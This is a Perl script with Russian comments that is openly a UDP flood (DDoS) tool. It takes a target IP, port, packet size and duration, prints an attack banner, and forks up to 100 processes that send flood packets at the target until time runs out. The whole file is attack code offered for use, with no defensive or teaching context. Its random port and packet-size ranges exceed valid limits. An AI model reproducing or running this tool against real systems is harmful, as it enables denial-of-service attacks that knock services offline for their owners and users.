#!/usr/bin/perl

use strict;
use warnings;
use Socket;
use Term::ANSIColor qw(:constants);
use Parallel::ForkManager;  # Модуль для параллельных процессов

$Term::ANSIColor::AUTORESET = 2;

# Вводимые параметры
my ($ip, $port, $size, $time) = @ARGV;

# Проверка входных данных
unless ($ip) {
    die "Использование: $0 <IP> <PORT> <SIZE> <TIME>\n";
}

# Разрешение IP-адреса
my $iaddr = inet_aton($ip) or die "Не удалось разрешить хостнейм $ip\n";
my $endtime = time() + ($time ? $time : 100);

# Настройка сокета
socket(my $flood, PF_INET, SOCK_DGRAM, 17);

# Настройка параллельных процессов
my $pm = Parallel::ForkManager->new(100);  # Максимум 100 параллельных процессов

# Информация о начале атаки
print BOLD RED "🔥 Атака DDoS Запущена 🔥\n";
print BOLD GREEN "IP: $ip\n";
print BOLD YELLOW "ПОРТ: ", ($port ? $port : "Случайный"), "\n";
print BOLD BLUE "ПАКЕТЫ: ", ($size ? $size : "Размер по умолчанию"), "\n";
print BOLD MAGENTA "ВРЕМЯ: ", ($time ? "$time секунд" : "Неограниченно"), "\n";
print BOLD CYAN "⚡ Скрипт DDoS запускается ⚡\n";
print BOLD WHITE "Автор: xxjasontpikexx (DEEP-WEB)\n";
print BOLD BLUE "Отправка $size пакетов на цель\n";

# Подготовка сообщений
print "~ 💥 Атакуем $ip ", ($port ? "через порт $port" : "с случайным портом"), "\n";
print "~ Размер пакетов: ", ($size ? "$size байт" : "Размер пакета по умолчанию"), "\n";
print "~ Длительность атаки: ", ($time ? "$time секунд" : "Неограниченно"), "\n";
print "Нажмите Ctrl-C для остановки\n" unless $time;

# Запуск атаки с использованием нескольких процессов
for (; time() <= $endtime;) {
    $pm->start and next;  # Запуск нового процесса

    my $psize = $size ? $size : int(rand(1500000 - 64) + 64);  # Размер пакета
    my $pport = $port ? $port : int(rand(1500000)) + 1;  # Порт

    send($flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));

    $pm->finish;  # Завершаем процесс
}

$pm->wait_all_children;  # Ждем завершения всех процессов
print BOLD RED "Атака завершена\n";
